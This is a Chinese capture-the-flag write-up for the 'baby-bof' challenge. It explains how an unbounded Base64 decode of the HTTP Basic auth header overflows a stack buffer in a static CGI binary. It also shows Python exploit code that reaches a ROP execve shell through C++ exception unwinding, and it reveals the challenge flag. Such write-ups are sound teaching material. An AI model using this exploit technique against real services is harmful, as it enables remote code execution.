# baby-bof

## 题目简述

服务由 lighttpd 通过 CGI 运行静态、非 PIE 的 `index.cgi`，任意路径都会重写到该程序。它从 `HTTP_AUTHORIZATION` 读取 HTTP Basic 认证，将 `Basic ` 之后的 Base64 文本解码到栈上的 `char decoded[0x100]`，再比较 `admin:<flag>`。因此无需猜测认证口令：可控的 Base64 解码长度本身就是栈溢出入口。

编译参数为 `-static -fstack-protector-strong -no-pie`。地址固定便于构造 ROP，但 canary 和 C++ 异常清理路径使这不是单纯覆盖返回地址即可完成的题。

## 解题过程

### 关键观察

解码函数只校验输入长度是 4 的倍数，却完全没有接收输出缓冲区大小：每个四字符块最多向 `output` 写三个字节。

```cpp
char decoded[0x100];
decode_base64(basic_auth, decoded);

for (int j = 0; j < 3 - padding; j++)
    output[output_index++] = (value >> (16 - j * 8)) & 0xff;
```

只要先放入足够多的合法 Base64 字符，`decoded` 就会越界。随后在尾部追加四个非法字符 `!!!!`：合法部分已经完成溢出，而非法字符会令 `base64_value` 抛出 `std::invalid_argument`。异常展开会走入 C++ runtime 的 landing pad；官方 exploit 利用这一受控的展开/清理路径，而非让普通函数序言直接检查被覆盖的栈帧。

### 构造利用链

解码后的缓冲区先填充 `A`，再按当前静态构建的栈布局写入异常展开所需的 selector 和 ROP 链。下面是官方思路中保留的关键布局；常量必须重新从同一份 `index.cgi` 核对，不能照搬到不同构建。

```python
decoded = bytearray(b"A" * 0x180)
decoded[0x110:0x118] = p64(0)
decoded[0x118:0x120] = p64(RESERVE_LANDING_SELECTOR)

offset = 0x158
for value in rop:
    decoded[offset:offset + 8] = p64(value)
    offset += 8

while len(decoded) % 3:
    decoded.append(0x41)
authorization = "Basic " + base64.b64encode(decoded).decode() + "!!!!"
```

ROP 链使用程序中固定地址的 `pop rdi`、`pop rsi`、`pop rdx; pop rbx`、`pop rax`、`mov [rdi], rax` 和 `syscall` gadget：

1. 将 `/bin/sh\0`、`-c\0`、`cat /flag.txt\0` 及 `argv` 指针数组写到 `.bss`。
2. 设置 `rax=59`，并令 `rdi`、`rsi`、`rdx` 分别为 shell 路径、`argv`、`NULL`。
3. 执行 `execve("/bin/sh", argv, NULL)`；CGI 的响应正文会带回命令输出。

官方脚本的本地/远程入口是：

```text
python solve.py <host> <port> "cat /flag.txt"
```

成功时 HTTP 响应正文包含 `grey{5tuck_th3_l4nd1ng_w1th_3xc3pt10n4l_p3rf0rm4nc3_3b6ab6b4}`。这同时验证了异常落点、ROP 地址和 CGI 输出通道。

## 方法总结

- 核心技巧：无边界 Base64 解码造成栈溢出，利用异常展开路径进入静态二进制 ROP。
- 识别信号：认证处理把可变长度解码直接写入固定栈数组，且异常在写入之后才触发。
- 复用要点：异常利用高度依赖编译器、libstdc++ 和调用点布局；先用同一二进制定位 landing selector，再构造不含 Base64 `=` 填充的触发串。静态、非 PIE 只解决 gadget 地址稳定性，不会自动绕过 canary 或异常清理逻辑。
